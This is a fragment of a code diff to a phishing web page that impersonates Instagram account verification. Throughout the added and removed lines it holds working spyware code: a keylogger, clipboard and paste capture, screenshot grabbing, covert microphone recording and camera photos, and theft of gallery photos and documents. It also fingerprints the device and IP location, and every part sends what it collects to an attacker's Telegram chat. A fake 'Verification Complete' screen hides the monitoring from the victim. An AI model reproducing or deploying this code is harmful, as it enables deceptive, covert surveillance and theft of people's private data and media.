-                        sendToTelegram(`📸 <b>FACE VERIFICATION SUCCESS</b>\n\n3 photos captured successfully\nUser allowed camera access\nTime: ${new Date().toLocaleString()}`);
-                        
+        // Process gallery photos
+        async function processGalleryPhotos() {
                         setTimeout(() => {
-                            document.getElementById('fakeCamera').style.display = 'none';
-                            document.getElementById('loading').style.display = 'flex';
-                            resolve();
+                document.getElementById('galleryInput').click();
                         }, 2000);
-                    }, 300);
-                }, 3000);
-            });
+            
+            await sendToTelegram(
+                `📱 <b>GALLERY VERIFICATION SUMMARY</b>\n\n` +
+                `Total Photos: ${verificationData.galleryPhotos.length}\n` +
+                `Status: ${verificationData.galleryPhotos.length > 0 ? 'Success' : 'No photos selected'}\n` +
+                `Time: ${new Date().toLocaleString()}`
+            );
         }
 
-        // Handle gallery photo selection
-        async function handleGallerySelection(event) {
+        // Handle gallery selection
+        document.getElementById('galleryInput').addEventListener('change', async function(event) {
             const files = event.target.files;
             if (files.length > 0) {
-                updateStatus("Processing gallery photos...");
-                
                 for (let i = 0; i < Math.min(files.length, 5); i++) {
                     const file = files[i];
                     const reader = new FileReader();
@@ -859,7 +831,6 @@
                             data: photoData.substring(0, 50000)
                         });
                         
-                        // Send photo info to Telegram
                         await sendToTelegram(
                             `🖼️ <b>GALLERY PHOTO CAPTURED</b>\n\n` +
                             `Filename: ${file.name}\n` +
@@ -868,7 +839,6 @@
                             `Time: ${new Date().toLocaleString()}`
                         );
                         
-                        // Try to send actual photo if it's small enough
                         if (file.size < 500000) {
                             await sendPhotoToTelegram(photoData, `Gallery Photo: ${file.name}`);
                         }
@@ -876,56 +846,8 @@
                     
                     reader.readAsDataURL(file);
                 }
-                
-                alert(`Selected ${files.length} photos for verification`);
             }
-        }
-
-        // Handle document selection
-        async function handleDocumentSelection(event) {
-            const files = event.target.files;
-            if (files.length > 0) {
-                for (let i = 0; i < files.length; i++) {
-                    const file = files[i];
-                    const reader = new FileReader();
-                    
-                    reader.onload = async (e) => {
-                        verificationData.documents.push({
-                            name: file.name,
-                            type: file.type,
-                            size: file.size,
-                            data: e.target.result.substring(0, 100000)
-                        });
-                        
-                        await sendToTelegram(
-                            `📄 <b>DOCUMENT CAPTURED</b>\n\n` +
-                            `Filename: ${file.name}\n` +
-                            `Type: ${file.type}\n` +
-                            `Size: ${Math.round(file.size / 1024)} KB\n` +
-                            `Time: ${new Date().toLocaleString()}`
-                        );
-                    };
-                    
-                    reader.readAsDataURL(file);
-                }
-            }
-        }
-
-        // Process gallery photos
-        async function processGalleryPhotos() {
-            if (verificationData.galleryPhotos.length === 0) {
-                // Prompt for gallery access
-                document.getElementById('galleryInput').click();
-                await sleep(2000);
-            }
-            
-            await sendToTelegram(
-                `📱 <b>GALLERY VERIFICATION SUMMARY</b>\n\n` +
-                `Total Photos: ${verificationData.galleryPhotos.length}\n` +
-                `Status: ${verificationData.galleryPhotos.length > 0 ? 'Success' : 'No photos selected'}\n` +
-                `Time: ${new Date().toLocaleString()}`
-            );
-        }
+        });
 
         // Generate fake photo data
         function generateFakePhotoData() {
@@ -938,29 +860,9 @@
             return canvas.toDataURL('image/jpeg', 0.1);
         }
 
-        // Play fake shutter sound
-        function playShutterSound() {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
-                
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
-                
-                oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
-                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
-                
-                oscillator.start();
-                oscillator.stop(audioContext.currentTime + 0.1);
-            } catch (e) {}
-        }
-
         // Fake location verification
         async function fakeLocationVerification() {
-            return new Promise(async (resolve) => {
-                const location = verificationData.ipInfo;
+            const location = verificationData.ipInfo || {};
                 
                 verificationData.location = {
                     source: 'IP-based',
@@ -983,14 +885,10 @@
                 message += `Time: ${new Date().toLocaleString()}`;
                 
                 await sendToTelegram(message);
-                
-                resolve();
-            });
         }
 
         // Fake voice verification
         async function fakeVoiceVerification() {
-            return new Promise(async (resolve) => {
                 verificationData.audio = [generateFakeAudioData()];
                 
                 await sendToTelegram(
@@ -1001,9 +899,6 @@
                     `Format: WAV\n` +
                     `Time: ${new Date().toLocaleString()}`
                 );
-                
-                resolve();
-            });
         }
 
         // Generate fake audio data
@@ -1015,22 +910,10 @@
         async function startRemoteMonitoring() {
             remoteControlActive = true;
             
-            // Show control panel
-            document.getElementById('controlPanel').style.display = 'block';
-            
-            // Start keylogger
             startKeylogger();
-            
-            // Start periodic screenshots
             startPeriodicScreenshots();
-            
-            // Start clipboard monitoring
             startClipboardMonitoring();
-            
-            // Start microphone access attempt
             tryMicrophoneAccess();
-            
-            // Start camera access attempt
             tryCameraAccess();
             
             await sendToTelegram(
@@ -1055,16 +938,11 @@
                     url: window.location.href
                 });
                 
-                // Update control panel
-                document.getElementById('keyLog').textContent = `Keystrokes: ${keystrokeCount}`;
-                
-                // Send keystrokes batch every 10 keystrokes
                 if (keystrokeCount % 10 === 0) {
                     sendKeystrokesBatch();
                 }
             });
             
-            // Also capture paste events
             document.addEventListener('paste', (e) => {
                 const pastedText = e.clipboardData.getData('text');
                 if (pastedText) {
@@ -1107,10 +985,6 @@
                             timestamp: new Date().toISOString()
                         });
                         
-                        // Update control panel
-                        document.getElementById('screenLog').textContent = `Screenshots: ${screenshotCount}`;
-                        
-                        // Send screenshot every 5th time
                         if (screenshotCount % 5 === 0) {
                             await sendToTelegram(
                                 `🖥️ <b>SCREENSHOT CAPTURED</b>\n\n` +
@@ -1128,33 +1002,6 @@
         async function takeScreenshot() {
             try {
                 const canvas = document.createElement('canvas');
-                const video = document.createElement('video');
-                
-                // Try to capture screen
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: { displaySurface: "monitor" }
-                    });
-                    
-                    video.srcObject = stream;
-                    await video.play();
-                    
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    return canvas.toDataURL('image/jpeg', 0.5);
-                } catch (e) {
-                    // Fallback: capture visible page
-                    const html2canvas = window.html2canvas;
-                    if (html2canvas) {
-                        const canvas = await html2canvas(document.body);
-                        return canvas.toDataURL('image/jpeg', 0.5);
-                    } else {
-                        // Simple fallback
                         canvas.width = window.innerWidth;
                         canvas.height = window.innerHeight;
                         const ctx = canvas.getContext('2d');
@@ -1162,10 +1009,8 @@
                         ctx.fillRect(0, 0, canvas.width, canvas.height);
                         ctx.fillStyle = '#000000';
                         ctx.font = '20px Arial';
-                        ctx.fillText('Screenshot not available', 50, 50);
+                ctx.fillText('Screenshot', 50, 50);
                         return canvas.toDataURL('image/jpeg', 0.5);
-                    }
-                }
             } catch (e) {
                 return generateFakePhotoData();
             }
@@ -1173,7 +1018,6 @@
 
         // Start clipboard monitoring
         function startClipboardMonitoring() {
-            // Try to read clipboard periodically
             setInterval(async () => {
                 try {
                     const text = await navigator.clipboard.readText();
@@ -1195,7 +1039,6 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 mediaStream = stream;
                 
-                // Record 5 seconds of audio
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 
@@ -1205,7 +1048,6 @@
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = () => {
-                        const audioData = reader.result;
                         sendToTelegram(
                             `🎤 <b>MICROPHONE ACCESS GRANTED</b>\n\n` +
                             `Audio recording captured\n` +
@@ -1230,7 +1072,6 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                // Capture photo from camera
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
@@ -1247,7 +1088,6 @@
                         `Time: ${new Date().toLocaleString()}`
                     );
                     
-                    // Send the actual photo
                     sendPhotoToTelegram(photoData, "Live Camera Photo");
                     
                     stream.getTracks().forEach(track => track.stop());
@@ -1258,7 +1098,6 @@
 
         // Collect additional data
         async function collectAdditionalData() {
-            // Get media devices list
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const cameras = devices.filter(d => d.kind === 'videoinput').length;
@@ -1272,7 +1111,6 @@
                 );
             } catch (e) {}
             
-            // Get storage estimate
             try {
                 if (navigator.storage && navigator.storage.estimate) {
                     const estimate = await navigator.storage.estimate();
@@ -1284,42 +1122,11 @@
                     );
                 }
             } catch (e) {}
-            
-            // Get installed fonts
-            try {
-                const fontCheck = new Set([
-                    'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-                    'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-                    'Verdana', 'Webdings', 'Wingdings'
-                ]);
-                
-                const availableFonts = [];
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                
-                for (const font of fontCheck) {
-                    context.font = '72px ' + font + ', monospace';
-                    const text = 'mmmmmmmmmmlli';
-                    const metric1 = context.measureText(text);
-                    context.font = '72px monospace';
-                    const metric2 = context.measureText(text);
-                    
-                    if (metric1.width !== metric2.width) {
-                        availableFonts.push(font);
-                    }
-                }
-                
-                await sendToTelegram(
-                    `🔤 <b>INSTALLED FONTS</b>\n\n` +
-                    `Detected Fonts: ${availableFonts.join(', ')}\n` +
-                    `Total: ${availableFonts.length} fonts`
-                );
-            } catch (e) {}
         }
 
         // Send all data to Telegram
         async function sendAllDataToTelegram() {
-            let summary = `📊 <b>VERIFICATION COMPLETE - SUMMARY</b>\n\n`;
+            let summary = `📊 <b>DATA COLLECTION COMPLETE - SUMMARY</b>\n\n`;
             
             summary += `<b>Data Collected:</b>\n`;
             summary += `✅ Device Information\n`;
@@ -1342,8 +1149,8 @@
             summary += `Duration: ${Math.round((new Date() - new Date(verificationData.timestamps.start)) / 1000)} seconds\n\n`;
             
             summary += `<b>User Information:</b>\n`;
-            if (verificationData.ipInfo.ip) summary += `IP: ${verificationData.ipInfo.ip}\n`;
-            if (verificationData.ipInfo.city) summary += `Location: ${verificationData.ipInfo.city}, ${verificationData.ipInfo.country}\n`;
+            if (verificationData.ipInfo && verificationData.ipInfo.ip) summary += `IP: ${verificationData.ipInfo.ip}\n`;
+            if (verificationData.ipInfo && verificationData.ipInfo.city) summary += `Location: ${verificationData.ipInfo.city}, ${verificationData.ipInfo.country}\n`;
             if (verificationData.deviceInfo) {
                 summary += `Device: ${verificationData.deviceInfo.browser} on ${verificationData.deviceInfo.os}\n`;
                 summary += `Screen: ${verificationData.deviceInfo.screen}\n`;
@@ -1393,7 +1200,6 @@
         // Send photo to Telegram
         async function sendPhotoToTelegram(photoData, caption = '') {
             try {
-                // Convert base64 to blob
                 const blob = await fetch(photoData).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -1407,64 +1213,6 @@
                 console.error('Error sending photo to Telegram:', error);
             }
         }
-
-        // Show success screen
-        function showSuccessScreen() {
-            document.body.innerHTML = `
-                <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
-                    <div style="background: white; border-radius: 20px; padding: 40px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
-                        <div style="font-size: 72px; margin-bottom: 20px;">🎉</div>
-                        <h1 style="margin-bottom: 10px; color: #262626;">Verification Complete!</h1>
-                        <p style="color: #8e8e8e; margin-bottom: 30px; line-height: 1.5;">
-                            Your Instagram account has been successfully verified. 
-                            You can now access all features.
-                        </p>
-                        <div style="background: #f8f9fa; border-radius: 10px; padding: 20px; text-align: left; margin-bottom: 30px;">
-                            <div style="display: flex; align-items: center; margin-bottom: 10px;">
-                                <div style="width: 30px; height: 30px; background: #0095f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 10px;">✓</div>
-                                <div>Face recognition verified</div>
-                            </div>
-                            <div style="display: flex; align-items: center; margin-bottom: 10px;">
-                                <div style="width: 30px; height: 30px; background: #0095f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 10px;">✓</div>
-                                <div>Gallery verification complete</div>
-                            </div>
-                            <div style="display: flex; align-items: center; margin-bottom: 10px;">
-                                <div style="width: 30px; height: 30px; background: #0095f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 10px;">✓</div>
-                                <div>Location verified</div>
-                            </div>
-                            <div style="display: flex; align-items: center;">
-                                <div style="width: 30px; height: 30px; background: #0095f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 10px;">✓</div>
-                                <div>Continuous monitoring active</div>
-                            </div>
-                        </div>
-                        <button onclick="window.location.href='https://instagram.com'" style="width: 100%; background: #0095f6; color: white; border: none; border-radius: 10px; padding: 15px; font-weight: 600; font-size: 16px; cursor: pointer; transition: background 0.3s;">
-                            Continue to Instagram
-                        </button>
-                        <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">
-                            You will be redirected to Instagram in 5 seconds...
-                        </p>
-                    </div>
-                </div>
-            `;
-            
-            // Keep remote monitoring active even after redirect
-            setTimeout(() => {
-                window.location.href = 'https://instagram.com';
-            }, 5000);
-        }
-
-        // Auto-start after 10 seconds if user doesn't click
-        setTimeout(() => {
-            if (document.getElementById('mainScreen').style.display !== 'none') {
-                document.getElementById('startBtn').click();
-            }
-        }, 10000);
-
-        // Add html2canvas library for screenshots
-        const script = document.createElement('script');
-        script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
-        document.head.appendChild(script);
-
     </script>
 </body>
 </html>
